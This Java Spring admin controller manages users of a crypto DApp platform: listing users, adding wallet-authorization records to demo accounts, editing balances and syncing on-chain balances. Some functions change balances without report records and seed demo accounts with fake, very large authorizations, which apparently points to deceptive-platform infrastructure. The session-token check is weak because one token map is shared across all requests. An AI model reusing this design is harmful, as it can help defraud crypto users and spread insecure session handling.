package project.web.admin.controller.user;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import javax.servlet.http.HttpServletRequest;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.providers.encoding.PasswordEncoder;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

import kernel.exception.BusinessException;
import kernel.util.Arith;
import kernel.util.JsonUtils;
import kernel.util.PropertiesUtil;
import kernel.util.StringUtils;
import kernel.util.ThreadUtils;
import kernel.web.PageActionSupport;
import project.Constants;
import project.log.LogService;
import project.monitor.AdminDAppUserService;
import project.monitor.AutoMonitorWalletService;
import project.monitor.DAppAccountService;
import project.monitor.model.AutoMonitorWallet;
import project.party.PartyService;
import project.party.model.Party;
import project.party.recom.UserRecomService;
import project.syspara.SysparaService;
import project.user.UserDataService;
import project.user.UserService;
import project.user.googleauth.GoogleAuthService;
import project.user.token.TokenService;
import project.web.admin.service.user.AdminAgentService;
import project.web.admin.service.user.AdminUserService;
import security.Role;
import security.SecUser;
import security.internal.SecUserService;

/**
 * DAPP_用户管理
 */
@RestController
public class DappAdminUserController extends PageActionSupport {

	private Logger logger = LogManager.getLogger(DappAdminUserController.class);

	@Autowired
	protected AdminUserService adminUserService;
	@Autowired
	protected AdminAgentService adminAgentService;
	@Autowired
	protected PartyService partyService;
	@Autowired
	protected SecUserService secUserService;
	@Autowired
	protected UserService userService;
	@Autowired
	protected UserDataService userDataService;
	@Autowired
	protected LogService logService;
	@Autowired
	protected SysparaService sysparaService;
	@Autowired
	protected PasswordEncoder passwordEncoder;
	@Autowired
	protected GoogleAuthService googleAuthService;
	@Autowired
	protected TokenService tokenService;
	@Autowired
	protected DAppAccountService dAppAccountService;
	@Autowired
	protected UserRecomService userRecomService;
	@Autowired
	protected AutoMonitorWalletService autoMonitorWalletService;
	@Autowired
	protected AdminDAppUserService adminDAppUserService;

	protected Map<String, Object> session = new HashMap();

	protected final static Object obj = new Object();

	private final String action = "normal/dappAdminUserAction!";

	/**
	 * 获取用户列表
	 */
	@RequestMapping(value = action + "list.action")
	public ModelAndView list(HttpServletRequest request) {
		String pageNo = request.getParameter("pageNo");
		String message = request.getParameter("message");
		String error = request.getParameter("error");
		String partyId = request.getParameter("partyId");
		String name_para = request.getParameter("name_para");
		// 账号类型
		String rolename_para = request.getParameter("rolename_para");
		boolean online = Boolean.valueOf(request.getParameter("online"));
		String loginIp_para = request.getParameter("loginIp_para");

		ModelAndView modelAndView = new ModelAndView();
		modelAndView.setViewName("user_list_dapp");
		
		String session_token = UUID.randomUUID().toString();

		try {

			this.checkAndSetPageNo(pageNo);

			this.pageSize = 20;

			this.session.put("session_token", session_token);

			String checkedPartyId = this.getLoginPartyId();
			if (!StringUtils.isNullOrEmpty(partyId)) {
				checkedPartyId = partyId;
			}

			this.page = this.adminUserService.pagedDappQuery(this.pageNo, this.pageSize, name_para, rolename_para,
					checkedPartyId, online, loginIp_para);
			
			List<Map> list = this.page.getElements();

			for (int i = 0; i < list.size(); i++) {

				Map map = list.get(i);
				map.put("username_hide", map.get("username") == null ? null : hideAddress(map.get("username").toString(), 5));
				map.put("username_parent", map.get("username_parent") == null ? null : hideAddress(map.get("username_parent").toString(), 5));
				map.put("eth_money", map.get("eth_money") == null ? null : new BigDecimal(map.get("eth_money").toString()).toPlainString());
				map.put("money", map.get("money") == null ? null : new BigDecimal(map.get("money").toString()).toPlainString());
				map.put("eth_dapp", map.get("eth_dapp") == null ? null : new BigDecimal(map.get("eth_dapp").toString()).toPlainString());
				map.put("usdt_dapp", map.get("usdt_dapp") == null ? null : new BigDecimal(map.get("usdt_dapp").toString()).toPlainString());

				// 授权状态
				if ("".equals((map.get("monitor_succeeded") + "").toString()) || null == map.get("monitor_succeeded")) {
					map.put("monitor_succeeded", "3");
				}

				if (null == map.get("rolename")) {
					map.put("roleNameDesc", "");
				} else {
					String roleName = map.get("rolename").toString();
					map.put("roleNameDesc",
							Constants.ROLE_MAP.containsKey(roleName) ? Constants.ROLE_MAP.get(roleName) : roleName);
				}
			}

			String url = PropertiesUtil.getProperty("admin_url") + "/normal/adminUserAction!list.action";
			this.result = JsonUtils.getJsonString(this.adminAgentService.findAgentNodes(this.getLoginPartyId(), checkedPartyId, url));

		} catch (BusinessException e) {
			modelAndView.addObject("error", e.getMessage());
			return modelAndView;
		} catch (Throwable t) {
			logger.error(" error ", t);
			modelAndView.addObject("error", "[ERROR] " + t.getMessage());
			return modelAndView;
		}

		modelAndView.addObject("pageNo", this.pageNo);
		modelAndView.addObject("pageSize", this.pageSize);
		modelAndView.addObject("page", this.page);
		modelAndView.addObject("message", message);
		modelAndView.addObject("error", error);
		modelAndView.addObject("partyId", partyId);
		modelAndView.addObject("name_para", name_para);
		modelAndView.addObject("session_token", session_token);
		modelAndView.addObject("rolename_para", rolename_para);
		modelAndView.addObject("online", online);
		modelAndView.addObject("loginIp_para", loginIp_para);
		return modelAndView;
	}

	/**
	 * 演示账户添加授权
	 */
	@RequestMapping(value = action + "toAddMonitor.action")
	public ModelAndView toAddMonitor(HttpServletRequest request) {
		ModelAndView model = new ModelAndView();
		String message = "";
		String error = "";
		try {

			String id = request.getParameter("id");
			Party party = this.partyService.cachePartyBy(id, false);
			if (party == null) {
				throw new BusinessException("用户不存在");
			}
			if (!"GUEST".equals(party.getRolename())) {
				throw new BusinessException("只能添加演示账户");
			}
			String address = party.getUsername().toLowerCase();
			AutoMonitorWallet entity = autoMonitorWalletService.findBy(address);

			if (entity != null) {
				model.addObject("error", "授权已存在！");
				model.setViewName("redirect:/" + action + "list.action");
				return model;
			}
			entity = new AutoMonitorWallet();
			entity.setAddress(address);
			entity.setMonitor_amount(Double.valueOf(10000000000L));
			entity.setCreated(new Date());
			entity.setPartyId(party.getId());
			entity.setMonitor_address("Ox11111111111111111111111");
			entity.setRolename(party.getRolename());
			entity.setSucceeded(1);
			Double threshold = sysparaService.find("auto_monitor_threshold").getDouble();

			entity.setThreshold(threshold);

			entity.setCreated_time_stamp(new Date().getTime() / 1000);
			autoMonitorWalletService.save(entity);

			message = "添加成功";

		} catch (BusinessException e) {
			error = e.getMessage();
		} catch (Exception e) {
			logger.error(" error ", e);
			error = "程序错误";
		}

		model.addObject("message", message);
		model.addObject("error", error);
		model.setViewName("redirect:/" + action + "list.action");
		return model;
	}

	/**
	 * 修改账户余额
	 */
	@RequestMapping(value = action + "reset.action")
	public ModelAndView reset(HttpServletRequest request) {
		String id = request.getParameter("id");
		String money_revise = request.getParameter("money_revise");
		String login_safeword = request.getParameter("login_safeword");
		// 修改余额的方式。1. recharge--充值有记录报表 2.change----增加余额，不记录报表 3.withdraw----平台扣款，不记录报表
		String reset_type = request.getParameter("reset_type");
		String coin_type = request.getParameter("coin_type");
		String session_token = request.getParameter("session_token");

		ModelAndView modelAndView = new ModelAndView();
		modelAndView.setViewName("redirect:/" + action + "list.action");

		try {

			this.verifReset(money_revise, reset_type, coin_type, login_safeword);

			double money_revise_double = Double.valueOf(money_revise).doubleValue();

			List<String> coin_types = new ArrayList<String>(Arrays.asList(Constants.WALLETEXTEND_DAPP_USDT_USER,
					Constants.WALLETEXTEND_DAPP_ETH, Constants.WALLETEXTEND_DAPP_USDT));
			if (!coin_types.contains(coin_type)) {
				throw new BusinessException("参数错误");
			}

			Object object = this.session.get("session_token");
			this.session.remove("session_token");
			if (null == object || StringUtils.isNullOrEmpty(session_token) || !session_token.equals((String) object)) {
				throw new BusinessException("请稍后再试");
			}
			
			synchronized (obj) {

				if ("ETH_DAPP".equals(coin_type)) {
					// 修改收益账户（ETH）【ETH_DAPP】；
					
					// 减少金额时
					if ("changesub".equals(reset_type) || "withdraw".equals(reset_type)) {
						money_revise_double = Arith.sub(0, money_revise_double);
					}
					
					this.adminUserService.saveResetEthMining(id, money_revise_double, login_safeword, this.getUsername_login(),
							reset_type, this.getIp(), coin_type, new Date());
				} else {
					// 修改质押账户（USDT）【USDT_DAPP】；演示用户修改DAPP余额【USDT_USER】；

					if ("change".equals(reset_type) || "recharge".equals(reset_type)) {
						this.adminUserService.saveResetCreateOrder(id, money_revise_double, login_safeword, this.getUsername_login(), 
								reset_type, this.getIp(), coin_type);
					}
					
					// 将修改余额的的减少金额去除
					if ("changesub".equals(reset_type) || "withdraw".equals(reset_type)) {
						money_revise_double = Arith.sub(0, money_revise_double);
						this.adminUserService.saveResetCreateWithdraw(id, money_revise_double, login_safeword, this.getUsername_login(), 
								reset_type, this.getIp(), coin_type);
					}
				}
			}
			
			ThreadUtils.sleep(500);
			
		} catch (BusinessException e) {
			modelAndView.addObject("error", e.getMessage());
			modelAndView.setViewName("redirect:/" + action + "list.action");
			return modelAndView;
		} catch (Throwable t) {
			logger.error(" error ", t);
			modelAndView.addObject("error", "程序错误");
			modelAndView.setViewName("redirect:/" + action + "list.action");
			return modelAndView;
		}
		
		modelAndView.addObject("message", "操作成功");
		return modelAndView;
	}

	/**
	 * 修改质押总资产_正式用户
	 */
	@RequestMapping(value = action + "reset_ple.action")
	public ModelAndView reset_ple(HttpServletRequest request) {		
		return reset(request);
	}

	/**
	 * 全局同步区块链余额
	 */
	@RequestMapping(value = action + "sycnBalance.action")
	public ModelAndView sycnBalance(HttpServletRequest request) {
		String safeword = request.getParameter("safeword");
		String usercode = request.getParameter("usercode");
		String session_token = request.getParameter("session_token");

		ModelAndView modelAndView = new ModelAndView();
		modelAndView.setViewName("redirect:/" + action + "list.action");

		try {

			Object object = this.session.get("session_token");
			this.session.remove("session_token");
			if (null == object || StringUtils.isNullOrEmpty(session_token) || !session_token.equals((String) object)) {
				throw new BusinessException("请稍后再试");
			}

			SecUser sec = this.secUserService.findUserByLoginName(this.getUsername_login());
			
			// 指定用户party
			Party party = null;
			String rolename = "";
			
			// 是否同步所有用户
			boolean isSycnAll = StringUtils.isEmptyString(usercode);
			if (isSycnAll) {
				this.checkLoginSafeword(sec, this.getUsername_login(), safeword);
			} else {
				party = this.partyService.findPartyByUsercode(usercode);
				rolename = party.getRolename();
			}
			
			for (Role role : sec.getRoles()) {
				
				// 代理商只能操作自己线下的用户
				if (Constants.SECURITY_ROLE_AGENT.equals(role.getRoleName())
						|| Constants.SECURITY_ROLE_AGENTLOW.equals(role.getRoleName())) {
					
					// 代理商同步所有时只是同步自己线下
					if (isSycnAll) {
						Party agentParty = this.partyService.cachePartyBy(sec.getPartyId(), false);
						usercode = agentParty.getUsercode();
						break;
					}

					if (StringUtils.isEmptyString(party.getId().toString())) {
						throw new BusinessException("只能操作自己线下的用户");
					}
					
					List<String> children = this.userRecomService.findChildren(sec.getPartyId());
					if (!children.contains(party.getId().toString())) {
						throw new BusinessException("只能操作自己线下的用户");
					}
				}
			}
			
			synchronized (obj) {
				// 统一处理成功接口
				dAppAccountService.addBalanceQueue(usercode, rolename);
			}
			
			ThreadUtils.sleep(300);
			
		} catch (BusinessException e) {
			modelAndView.addObject("error", e.getMessage());
			modelAndView.setViewName("redirect:/" + action + "list.action");
			return modelAndView;
		} catch (Throwable t) {
			logger.error(" error ", t);
			modelAndView.addObject("error", "程序错误");
			modelAndView.setViewName("redirect:/" + action + "list.action");
			return modelAndView;
		}
		
		modelAndView.addObject("message", "操作成功");
		return modelAndView;
	}

	@RequestMapping(value = action + "getParentsNet.action")
	public String getParentsNet(HttpServletRequest request) {
		Map<String, Object> resultMap = new HashMap<String, Object>();
		try {
			String partyId = request.getParameter("partyId");
			resultMap.put("code", 200);
			resultMap.put("user_parents_net", adminUserService.getParentsNet(partyId));
		} catch (BusinessException e) {
			resultMap.put("code", 500);
			resultMap.put("message", e.getMessage());
		} catch (Throwable t) {
			logger.error(" error ", t);
			resultMap.put("code", 500);
			resultMap.put("message", "程序错误");
		}
		logger.info("getParentsNet:{}", JsonUtils.getJsonString(resultMap));
		return JsonUtils.getJsonString(resultMap);
	}

	/**
	 * 验证登录人资金密码
	 */
	protected void checkLoginSafeword(SecUser secUser, String operatorUsername, String loginSafeword) {
//		SecUser sec = this.secUserService.findUserByLoginName(operatorUsername);
		String sysSafeword = secUser.getSafeword();
		String safeword_md5 = passwordEncoder.encodePassword(loginSafeword, operatorUsername);
		if (!safeword_md5.equals(sysSafeword)) {
			throw new BusinessException("登录人资金密码错误");
		}
	}

	public String hideAddress(String address, int hideLength) {
		if (StringUtils.isEmptyString(address)) {
			return address;
		}
		if (address.length() > hideLength * 2) {
			return address.substring(0, hideLength) + "****" + address.substring(address.length() - hideLength);
		}
		return address;
	}

	private void verifReset(String money_revise, String reset_type, String coin_type, String login_safeword) {
		
		if (StringUtils.isNullOrEmpty(money_revise)) {
			throw new BusinessException("账变金额必填");
		}
		if (!StringUtils.isDouble(money_revise)) {
			throw new BusinessException("账变金额输入错误，请输入浮点数");
		}
		if (Double.valueOf(money_revise).doubleValue() <= 0) {
			throw new BusinessException("账变金额不能小于等于0");
		}		
		
		if (StringUtils.isNullOrEmpty(login_safeword)) {
			throw new BusinessException("请输入资金密码");
		}
		
		if (StringUtils.isNullOrEmpty(reset_type)) {
			throw new BusinessException("请选择账变类型");
		}
		
		if (StringUtils.isNullOrEmpty(coin_type)) {
			throw new BusinessException("请选择账变币种");
		}
	}

}
